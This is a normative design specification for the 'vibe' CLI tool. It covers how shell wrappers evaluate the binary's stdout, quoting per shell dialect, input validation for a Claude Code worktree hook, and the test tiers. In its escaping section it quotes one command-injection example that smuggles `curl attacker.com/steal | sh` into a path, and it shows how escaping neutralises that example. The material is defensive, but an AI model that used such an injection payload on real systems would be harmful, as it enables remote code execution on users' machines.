> 🇯🇵 [日本語版](./eval-contract.ja.md)

# The stdout Eval Contract

> **Status: Normative.** Unlike the historical specifications in this directory, this document describes the CURRENT Rust implementation and is the single source of truth for the shell-eval protocol. Code and spec must change together.

The key words **MUST** and **MUST NOT** are used in the RFC 2119 sense: they mark invariants that the implementation and any future change are required to preserve.

## 1. Overview

A child process cannot change its parent shell's current working directory. `vibe start` runs as a child of the user's shell, so it cannot `cd` on the shell's behalf. Instead, the shell wrapper function evaluates the binary's stdout in the parent shell's context.

This makes **stdout executable shell code** — the *eval channel*. Everything a human is meant to read goes to stderr — the *human channel*.

```mermaid
sequenceDiagram
    participant U as User
    participant W as Shell wrapper (parent shell)
    participant V as vibe (child process)
    U->>W: vibe start feature-x
    W->>V: spawn `command vibe start feature-x`
    V-->>W: stderr: progress, warnings, errors (shown directly)
    V-->>W: stdout: cd '/path/to/worktree'
    W->>W: eval stdout in the parent shell
    Note over W: cwd is now /path/to/worktree
```

Consequence: any stray byte on stdout is executed by the user's shell. The contract below exists to make that impossible by construction.

## 2. Terminology

| Term             | Meaning                                                                                          |
| ---------------- | ------------------------------------------------------------------------------------------------ |
| **eval channel** | stdout. Consumed verbatim by the wrapper and executed as shell code.                              |
| **human channel**| stderr. Progress, logs, warnings, errors, `--help`, `--version`. Never evaluated.                 |
| **wrapper**      | The shell function installed by `vibe shell-setup` that runs the binary and evals its stdout.      |
| **child binary** | The real `vibe` executable, invoked as `command vibe` / `^vibe` / `vibe.exe` to bypass the wrapper. |
| **`Outcome`**    | The value a command handler returns (`rust/crates/vibe-core/src/commands/mod.rs`); describes what — if anything — the binary should write to stdout. |
| **dialect**      | The output grammar variant selected by the internal global flag `--eval-dialect <posix\|nu\|powershell>`. Posix is the default (used whenever the flag is absent) and is the wire-compatible legacy grammar. |

## 3. Wrapper functions per shell

Emitted by `rust/crates/vibe-core/src/commands/shell_setup.rs` (`shell_function`), one per line, each followed by a single `\n`.

| Shell        | Wrapper text (byte-exact)                                                        |
| ------------ | -------------------------------------------------------------------------------- |
| bash, zsh    | `vibe() { eval "$(command vibe "$@")"; }`                                         |
| fish         | `function vibe; eval (command vibe $argv); end`                                   |
| nushell      | `def --env --wrapped vibe [...args] { let out = (^vibe --eval-dialect nu ...$args); for line in ($out \| lines) { if ($line \| str starts-with "__VIBE_CD__") { cd ($line \| str replace "__VIBE_CD__" "") } else { print $line } } }` |
| powershell   | `function vibe { $out = & vibe.exe --eval-dialect powershell @args; if ($out) { Invoke-Expression ($out -join "`n") } }` |

- Wrapper text and completion output **MUST** stay byte-identical across releases. Wrappers already sourced in users' rc files are not regenerated on upgrade; they depend on the exact bytes. The nushell and powershell rows changed once, in the release that introduced `--eval-dialect`; see §9 for the recorded exception.
- The **bash, zsh and fish wrappers are unchanged** and do not pass `--eval-dialect`; they rely on the Posix default.
- The nushell and powershell wrappers pass the internal flag `--eval-dialect`. Like `--claude-code-worktree-hook`, it is an internal flag and **MUST** stay out of the generated completions (`INTERNAL_FLAGS_NOT_EXPOSED` in `rust/crates/vibe/src/cli.rs`).
- The nushell wrapper requires **nu ≥ 0.83** (`str replace` matches a literal by default from that version). It **MUST** use `for`, not `each`: in nushell an `each` closure discards environment changes, so a `cd` inside `each` would not reach the caller.
- The nushell wrapper **MUST** be declared `--wrapped`. Without it, nu resolves flags at *parse* time against the signature, so any `vibe` invocation carrying a flag (`vibe start -b`, `vibe clean --force`, …) fails before the body ever runs. `--wrapped` sends unknown flags to the `...args` rest parameter verbatim, which is what makes flag forwarding work at all.
- `--with-completion` appends a completion script (fish and zsh only) plus a trailing `\n`. Any other shell is a `VibeError::Configuration` (exit 1).
- An unrecognised `--shell` / `$SHELL` value is also a `VibeError::Configuration` (exit 1), not an `Argument` error.

## 4. Normative rules: stdout

### 4.1 Single write point

- `rust/crates/vibe/src/eval_output.rs::write_outcome` is the **only** function in production code that writes to stdout.
- It is called **exactly once**, from `rust/crates/vibe/src/main.rs`, on the `Ok` branch of `dispatch`.
- Any other `println!`, `print!`, `std::io::stdout()`, or `dbg!` in production code is a defect. Command handlers in `vibe-core` **MUST NOT** print; they return an `Outcome` and let the binary decide.
- This rule is **mechanically enforced**, not merely documented: clippy's `print_stdout` and `dbg_macro` lints are denied workspace-wide, and `rust/clippy.toml` puts `std::io::stdout` on the disallowed-methods list. The single `#[allow]` in the workspace lives in `rust/crates/vibe/src/eval_output.rs`. A new stdout write anywhere else fails `just check-rust` / CI.
- If `write_outcome` fails (see the newline guard), the error is reported to stderr and the process exits non-zero — nothing is written to stdout.

### 4.2 stdout grammar per `Outcome` variant

| Constructor                | Emitted stdout                                       | Used by                                            |
| -------------------------- | ---------------------------------------------------- | -------------------------------------------------- |
| `Outcome::none()`          | nothing (zero bytes)                                  | `config`, `verify`, `trust`, `untrust`, `upgrade`, dry runs, hook-mode `clean` |
| `Outcome::cd(path)`        | exactly one line, in the selected dialect (§4.3)      | `start`, `scratch`, `jump`, `rename`, `clean`, `home` |
| `Outcome::stdout(text)`    | `text` verbatim, may be multi-line, carries its own trailing newline(s) | `shell-setup` (wrapper + completion) |
| `Outcome::stdout_path(p)`  | the bare path `p`, **no** trailing newline            | `start --claude-code-worktree-hook`                 |

Additional rules:

- `cd_path` and `stdout` are **mutually exclusive by construction**; every constructor sets at most one. `write_outcome` carries a `debug_assert!` so a future constructor that sets both is caught rather than silently dropping `stdout`.
- `write_outcome` **MUST** reject a `cd_path` containing `\n` or `\r` and return an error instead of printing. A newline would terminate the single `cd` line and let an attacker-controlled path inject a second command into the eval.
- `Outcome::stdout_path` applies the same `\n`/`\r` guard **at construction time**, returning `Err` — a worktree path can be derived from a user `path_script`, so it is untrusted for this purpose.
- `Outcome::stdout` is for **trusted, hand-built payloads only** (the wrapper function and completion scripts), which legitimately contain newlines. Untrusted text **MUST NOT** be passed to it.

### 4.3 Dialects: the `cd` grammar

The internal global flag `--eval-dialect <posix|nu|powershell>` selects the grammar used for an `Outcome::cd`. Accepted aliases: `nu` / `nushell`, `powershell` / `pwsh`.

| Dialect                       | stdout for `Outcome::cd(path)`                        |
| ----------------------------- | ------------------------------------------------------ |
| Posix (default, flag absent)  | `cd '<'\''-escaped path>'` + `\n`                       |
| Nushell (`nu`, `nushell`)     | `__VIBE_CD__<raw path>` + `\n`                          |
| Powershell (`powershell`, `pwsh`) | `Set-Location -LiteralPath '<''-escaped path>'` + `\n` |

Normative rules:

- When `--eval-dialect` is absent the output **MUST** be byte-identical to the Posix grammar. The default path is the legacy wire format and is not allowed to drift.
- The dialect affects **only** `cd` outcomes. `Outcome::none()`, `Outcome::stdout(text)` and `Outcome::stdout_path(p)` are **dialect-invariant** — `shell-setup` output, hook paths and the empty case are the same bytes in every dialect.
- The `\n` / `\r` guard on `cd_path` (§4.2) applies **before** dialect dispatch, so no dialect can be reached with a path that could break the single-line invariant.
- The nushell dialect emits the path as **data, never as code**: the `__VIBE_CD__` sentinel frames a raw, unquoted path, and the wrapper strips the prefix and hands the remainder to `cd` as a string value. Nothing in the line is ever parsed as nushell source.

## 5. Normative rules: stderr

- All human-facing output **MUST** go to stderr: `log`/`verbose_log`/`success_log`/`warn_log`/`error_log` (`rust/crates/vibe-core/src/output.rs`), progress rendering (`ProgressDrawTarget::stderr()`), interactive prompts, clap `--help` and parse errors, and the custom `--version` block.
- clap errors are written to stderr explicitly in `main.rs` (clap would otherwise send `--help` to stdout, which the wrapper would execute).
- Lifecycle hook output (`rust/crates/vibe-core/src/hooks.rs`): with no progress tracker, a hook's **stdout is forwarded to stderr**; with a tracker it is suppressed to keep the display clean. A failed hook always shows its stderr. Hook output **MUST NOT** reach the process's stdout under any configuration.
- `vibe-core` **MUST NOT** write to stdout at all; it has no stdout seam.

## 6. Escaping

`rust/crates/vibe-core/src/shell.rs`:

- `shell_escape(value)` replaces each `'` with `'\''` (close quote, escaped literal quote, reopen quote). `$`, backticks and double quotes are inert inside single quotes and are left as-is.
- `escape_shell_path` is an alias for paths.
- `format_cd_command(path)` produces `cd '<escaped>'`.
- The output of these functions **MUST** stay byte-stable; the escaping is the mitigation for shell output injection, and installed wrappers rely on the exact grammar.

Example: `/tmp/x'; curl attacker.com/steal | sh; echo '` becomes `cd '/tmp/x'\''; curl attacker.com/steal | sh; echo '\'''` — a single, inert `cd` argument.

Each dialect quotes according to the rules of its own shell:

| Dialect    | Escaping                                                                                   |
| ---------- | -------------------------------------------------------------------------------------------- |
| Posix      | `'` → `'\''` (close quote, escaped literal quote, reopen quote); the whole path is single-quoted. |
| Powershell | `'` → `''` (PowerShell escapes a single quote inside a single-quoted string by doubling it). `Set-Location` is invoked with `-LiteralPath`, not `-Path`, because `-Path` wildcard-interprets `[`, `]`, `*` and `?`, which are legal characters in a path. |
| Nushell    | **No escaping.** The path is emitted raw after the `__VIBE_CD__` sentinel. Nushell single-quoted strings support no escape sequences at all, so there is nothing to escape *to*; the sentinel framing makes the path pure data and removes the need. |

### 6.1 Known limitations and historical record

Before the dialect mechanism, the nushell and powershell wrappers were broken. This is stated explicitly because earlier revisions of this document claimed otherwise.

- **nushell — the old wrapper never worked at all.** `... | each { |line| nu -c $line }` starts a *child* `nu` process per line; a `cd` in a child process cannot change the caller's directory, so no path — quoted or not — ever took effect. Additionally the POSIX `'\''` idiom is a nushell *parse error*: nushell single-quoted strings support no escape sequences, and nushell has no `eval`. And it could not forward flags at all: the old signature was not `--wrapped`, so nu resolved flags at parse time and rejected every flag-bearing invocation (`vibe start -b`, `vibe clean --force`, …) before the body ran. Verified empirically on nushell 0.113.1. The previous claim that "ordinary paths (no single quotes) work correctly on all five shells" was **false for nushell**: on nushell nothing worked — not quoted paths, not plain paths, not flags.
- **powershell — the old wrapper was broken for two distinct reasons.** `Invoke-Expression (& vibe.exe $args)` interpreted the POSIX-escaped line under PowerShell quoting rules, so any path containing a single quote was mishandled; and whenever the binary produced no stdout (every `Outcome::none()` command), `Invoke-Expression` was called with an empty argument and threw *"Cannot bind argument to parameter 'Command'"*.

Both are fixed by the dialect mechanism: nushell no longer evaluates the line as code, powershell receives its own quoting dialect, and the new powershell wrapper guards on `if ($out)` before invoking.

Remaining limitations:

- **Wrappers are not auto-regenerated.** A user who pasted the old nushell or powershell snippet into their rc file keeps the old, buggy behavior until they re-run `vibe shell-setup` (or re-paste the snippet from the docs). This is by design: vibe never rewrites a user's shell configuration.
- The Posix wrapper bytes (bash, zsh, fish) are unchanged, so no working configuration is affected.

## 7. Adjacent protocol: Claude Code worktree hook (stdin JSON)

`start` and `clean` accept `--claude-code-worktree-hook`, an internal flag intended for Claude Code, not humans. It is excluded from the generated completions via `INTERNAL_FLAGS_NOT_EXPOSED` in `rust/crates/vibe/src/cli.rs`.

### 7.1 Request (stdin)

Read by `rust/crates/vibe-core/src/stdin.rs`, the untrusted-input boundary.

| Rule                                                                                             |
| ------------------------------------------------------------------------------------------------ |
| The payload **MUST** be a single JSON **object**; arrays, scalars and `null` are rejected.         |
| The payload **MUST** be ≤ 1 MB (`MAX_STDIN_SIZE`); reading stops at `max + 1` bytes, so an oversized payload is never fully buffered. |
| Empty / blank / unparsable input yields no value (the command then reports a usage error on stderr). |

Fields:

- `start`: `{"name": "<branch>"}` — **MUST** be a non-empty string, **MUST NOT** contain a NUL byte, and **MUST NOT** start with `-` (so `--force` / `-b` cannot be smuggled into a `git worktree add` flag slot). A branch given as a CLI argument takes precedence over stdin.
- `clean`: `{"worktree_path": "<abs path>"}` — **MUST** be a non-empty absolute path that passes `validate_path` (no NUL, no `\n`/`\r`, no `$(`, no backtick). `clean` additionally refuses a path that is not in the actual git worktree set.

### 7.2 Response (stdout)

| Command                          | stdout                                                               |
| -------------------------------- | --------------------------------------------------------------------- |
| `start --claude-code-worktree-hook` | the bare worktree path via `Outcome::stdout_path` — **no** trailing newline, and **not** a `cd` line |
| `clean --claude-code-worktree-hook` | nothing (`Outcome::none()`); Claude Code controls navigation          |
| both, dry run / refused path     | nothing                                                               |

Diagnostics for both are `[cc-worktree-hook]`-prefixed lines on stderr.

## 8. Testing responsibilities

| Tier                                                     | Proves                                                                                              |
| -------------------------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| Unit tests (`#[cfg(test)]` in `vibe-core` / `vibe`)       | Handler logic and the `Outcome` a handler returns. They **cannot** prove the stream split — no process boundary exists. |
| `rust/crates/vibe/tests/eval_contract.rs`                 | Drives the **built** binary with stdout and stderr on **separate pipes** and asserts the exact bytes on each stream. The only tier that can prove the split. |
| `rust/crates/vibe/tests/wrapper_round_trip.rs`            | Runs the **real shells** (bash, zsh, fish, nu, pwsh), installs the wrapper the binary emits, and asserts the shell's own cwd actually changed — including a path containing a single quote. The only tier that can prove the wrapper *works*, as opposed to that the bytes are what we expect. Each shell is skipped when the interpreter is absent; setting `VIBE_REQUIRE_SHELLS` turns absence into a failure, and CI sets it so no shell is silently skipped. |
| PTY E2E (`packages/e2e`)                                  | Interactive behaviour (prompts, TTY detection). A PTY **merges** the two streams by design, so it cannot assert the split. |

Rule: any change affecting the stdout/stderr split **MUST** add a case to `rust/crates/vibe/tests/eval_contract.rs`. Any change to a wrapper or to a dialect's `cd` grammar **MUST** additionally be covered by `wrapper_round_trip.rs`.

### 8.1 Traceability: MUST → enforcement

| Normative rule                                   | Mechanically enforced by                                                  |
| ------------------------------------------------ | --------------------------------------------------------------------------- |
| Single stdout write point (§4.1)                 | clippy `print_stdout` / `dbg_macro` denied workspace-wide; `std::io::stdout` disallowed in `rust/clippy.toml`; sole `#[allow]` in `eval_output.rs` |
| Byte-exact stdout grammar per dialect (§4.2, §4.3, §6) | exact-byte cases in `rust/crates/vibe/tests/eval_contract.rs`             |
| Wrappers actually change the shell's cwd (§3)    | `rust/crates/vibe/tests/wrapper_round_trip.rs` (real shells, `VIBE_REQUIRE_SHELLS` in CI) |
| Internal flags hidden from completions (§3, §7)  | `INTERNAL_FLAGS_NOT_EXPOSED` consistency tests in `rust/crates/vibe/src/cli.rs` |

## 9. Change control

The following are **breaking changes**, because already-installed shell wrappers and completion scripts depend on the exact bytes:

- any byte change to the wrapper text in `shell_setup.rs`;
- any byte change to the generated completion output;
- any change to `shell_escape` / `format_cd_command` output;
- any change to the `cd '<escaped>'` grammar (extra lines, dropped newline, different command).

Such a change **MUST** be treated as a breaking release and paired with an updated case in `eval_contract.rs`.

### 9.1 Recorded change: `--eval-dialect` (2.x minor)

The release that introduced `--eval-dialect` changed the **nushell and powershell** wrapper bytes. It shipped as a **2.x minor (`feat`)**, not a major, as a deliberate exception to the rule above.

Rationale for the exception: the rule exists to protect *working* user configurations. Neither replaced wrapper was working — the nushell one was structurally non-functional in three independent ways (a `cd` in a child `nu` process, an unparsable POSIX escape, and a non-`--wrapped` signature that rejected every flag-bearing invocation at parse time), and the powershell one threw on every empty-stdout command and mishandled quote-containing paths (§6.1). Replacing a never-functional wrapper regresses nothing. The bash, zsh and fish wrapper bytes — the ones users actually depend on — are unchanged.

Compatibility matrix:

| Combination                  | Behavior                                                                                     |
| ---------------------------- | ---------------------------------------------------------------------------------------------- |
| old pasted wrapper + new binary | No `--eval-dialect` is passed → Posix dialect → **exactly today's bytes**. No regression; the old wrapper stays as broken (or as working, for bash/zsh/fish) as it was. |
| new wrapper + old binary     | clap rejects the unknown flag: **exit 2**, stdout empty, nothing is evaluated. Fails safe — the user sees a clap error on stderr and never executes a partial line. |
| new wrapper + new binary     | `cd` works on all five shells, including paths containing a single quote.                     |

Any *future* change to a wrapper that is known to work **MUST** still be treated as breaking.

## 10. References

Implementation ground truth:

- `rust/crates/vibe/src/eval_output.rs` — the single stdout write point and the newline guard
- `rust/crates/vibe/src/main.rs` — the single call site; clap output routed to stderr
- `rust/crates/vibe-core/src/commands/mod.rs` — `Outcome` and its constructors
- `rust/crates/vibe-core/src/shell.rs` — `shell_escape`, `format_cd_command`
- `rust/crates/vibe-core/src/commands/shell_setup.rs` — wrapper text per shell
- `rust/crates/vibe-core/src/output.rs`, `rust/crates/vibe-core/src/hooks.rs` — the stderr side
- `rust/crates/vibe-core/src/stdin.rs`, `rust/crates/vibe/src/cli.rs` — the Claude Code hook protocol, `--eval-dialect`, and the internal-flag exclusion list
- `rust/clippy.toml` — the disallowed-methods list that keeps `std::io::stdout` out of production code
- `rust/crates/vibe/tests/eval_contract.rs` — the executable form of this specification
- `rust/crates/vibe/tests/wrapper_round_trip.rs` — real-shell round trip for every wrapper and dialect

Related documents:

- `docs/architecture.md`, "Shell Wrapper Architecture" — design history (describes the removed TypeScript implementation)
- `docs/SECURITY_CHECKLIST.md` §10 "Shell Output Injection" and §13 "eval / Dynamic Code Execution" — the threat-model view of this contract
